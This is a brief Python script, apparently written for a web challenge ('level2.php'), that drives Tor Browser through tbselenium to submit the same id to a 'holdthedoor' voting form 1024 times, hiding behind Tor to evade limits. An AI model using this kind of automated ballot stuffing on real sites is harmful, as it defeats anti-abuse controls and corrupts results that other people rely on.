#!/usr/bin/python3
from tbselenium.tbdriver import TorBrowserDriver

driver = TorBrowserDriver("/home/manuel/Downloads/tor-browser_es-ES")
driver.load_url('http://158.69.76.135/level2.php')

id = '2714'
times = 1024
times_success = 0

for i in range(times):
    driver.find_element_by_name('id').send_keys('2714')
    driver.find_element_by_name('holdthedoor').click()
    times_success += 1
    print('Sucess: {}'.format(times_success))

driver.close()
